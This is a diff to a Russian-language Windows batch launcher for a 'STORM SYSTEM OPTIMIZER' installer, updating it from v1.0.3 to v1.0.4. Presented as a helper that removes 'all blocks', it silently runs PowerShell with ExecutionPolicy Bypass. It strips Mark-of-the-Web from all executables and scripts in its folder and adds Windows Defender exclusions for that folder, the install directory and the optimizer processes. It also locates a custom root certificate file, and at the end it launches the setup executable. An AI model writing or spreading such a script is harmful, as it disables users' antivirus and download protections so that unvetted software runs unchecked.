@@ -13,25 +13,25 @@ if %errorLevel% neq 0 (
 )
 
 echo ============================================================
-echo   STORM SYSTEM OPTIMIZER v1.0.3 - СНЯТИЕ ВСЕХ БЛОКИРОВОК
+echo   STORM SYSTEM OPTIMIZER v1.0.4 - СНЯТИЕ ВСЕХ БЛОКИРОВОК
 echo   (Smart App Control, SmartScreen, Mark-of-the-Web, Defender)
 echo ============================================================
 echo.
 
 set "SCRIPT_DIR=%~dp0"
-set "CERT_FILE=%SCRIPT_DIR%StormTeamRootCA.cer"
+set "CERT_FILE=%SCRIPT_DIR%Files\StormTeamRootCA.cer"
 
 if not exist "%CERT_FILE%" (
-    set "CERT_FILE=%SCRIPT_DIR%..\StormTeamRootCA.cer"
+    set "CERT_FILE=%SCRIPT_DIR%StormTeamRootCA.cer"
+)
+if not exist "%CERT_FILE%" (
+    set "CERT_FILE=%SCRIPT_DIR%Files\STORM_Certificate.cer"
 )
 if not exist "%CERT_FILE%" (
     set "CERT_FILE=%SCRIPT_DIR%STORM_Certificate.cer"
 )
 if not exist "%CERT_FILE%" (
-    set "CERT_FILE=%SCRIPT_DIR%..\Files\StormTeamRootCA.cer"
-)
-if not exist "%CERT_FILE%" (
-    set "CERT_FILE=%SCRIPT_DIR%..\StormSoftwareRootCA.cer"
+    set "CERT_FILE=%SCRIPT_DIR%Files\StormSoftwareRootCA.cer"
 )
 
 :: ============================================================
@@ -66,7 +66,7 @@ if exist "%CERT_FILE%" (
 :: ============================================================
 echo.
 echo [3/5] Снятие интернет-меток блокировки (Unblock Mark-of-the-Web)...
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path '%SCRIPT_DIR%..' -Recurse -Include *.exe,*.dll,*.cer,*.bat,*.cmd,*.ps1 | ForEach-Object { Unblock-File -Path $_.FullName -ErrorAction SilentlyContinue }" >nul 2>&1
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path '%SCRIPT_DIR%' -Recurse -Include *.exe,*.dll,*.cer,*.bat,*.cmd,*.ps1 | ForEach-Object { Unblock-File -Path $_.FullName -ErrorAction SilentlyContinue }" >nul 2>&1
 echo [OK] Все файлы и библиотеки успешно разблокированы!
 
 :: ============================================================
@@ -74,26 +74,26 @@ echo [OK] Все файлы и библиотеки успешно разбло�
 :: ============================================================
 echo.
 echo [4/5] Добавление папки приложения в доверенную зону Защитника...
-powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%..' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\StormSystemOptimizer' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_SYSTEM_OPTIMIZER_1.0.3_Setup.exe' -ErrorAction SilentlyContinue" >nul 2>&1
+powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%SCRIPT_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath 'C:\Program Files\StormSystemOptimizer' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'StormSystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'STORM_SYSTEM_OPTIMIZER_1.0.4_Setup.exe' -ErrorAction SilentlyContinue" >nul 2>&1
 echo [OK] Исключения и защита от блокировок добавлены!
 
 :: ============================================================
 :: 6. Запуск приложения / установщика
 :: ============================================================
 echo.
-echo [5/5] Запуск STORM SYSTEM OPTIMIZER v1.0.3...
+echo [5/5] Запуск STORM SYSTEM OPTIMIZER v1.0.4...
 echo.
 echo ============================================================
 echo   ГОТОВО! Все блокировки системы сняты.
 echo ============================================================
 echo.
 
-if exist "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.3_Setup.exe" (
-    start "" "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.3_Setup.exe"
-) else if exist "%SCRIPT_DIR%..\Assembling\StormSystemOptimizer.exe" (
-    start "" "%SCRIPT_DIR%..\Assembling\StormSystemOptimizer.exe"
-) else if exist "%SCRIPT_DIR%..\STORM_SYSTEM_OPTIMIZER_1.0.3_Setup.exe" (
-    start "" "%SCRIPT_DIR%..\STORM_SYSTEM_OPTIMIZER_1.0.3_Setup.exe"
+if exist "%SCRIPT_DIR%Files\STORM_SYSTEM_OPTIMIZER_1.0.4_Setup.exe" (
+    start "" "%SCRIPT_DIR%Files\STORM_SYSTEM_OPTIMIZER_1.0.4_Setup.exe"
+) else if exist "%SCRIPT_DIR%Assembling\StormSystemOptimizer.exe" (
+    start "" "%SCRIPT_DIR%Assembling\StormSystemOptimizer.exe"
+) else if exist "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.4_Setup.exe" (
+    start "" "%SCRIPT_DIR%STORM_SYSTEM_OPTIMIZER_1.0.4_Setup.exe"
 )
 
 timeout /t 3 >nul
